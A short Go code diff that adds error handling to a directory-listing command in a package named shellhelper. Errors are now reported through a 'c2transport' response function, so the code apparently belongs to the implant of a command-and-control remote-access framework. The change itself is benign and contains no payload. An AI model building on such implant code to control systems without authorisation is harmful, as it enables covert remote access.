@@ -1,7 +1,6 @@
 package shellhelper
 
 import (
-	"log"
 	"os"
 	"path/filepath"
 
@@ -13,8 +12,11 @@ import (
 
 func LsCmdRun(cmd *cobra.Command, args []string) {
 	// Lists the contents of the specified directory.
-	target_dir, _ := cmd.Flags().GetString("dst")
-	log.Printf("Listing %s", target_dir)
+	target_dir, err := cmd.Flags().GetString("dst")
+	if err != nil {
+		c2transport.C2RespPrintf(cmd, "args error: %v", err)
+		return
+	}
 	out, err := util.LsPath(target_dir)
 	if err != nil {
 		out = err.Error()
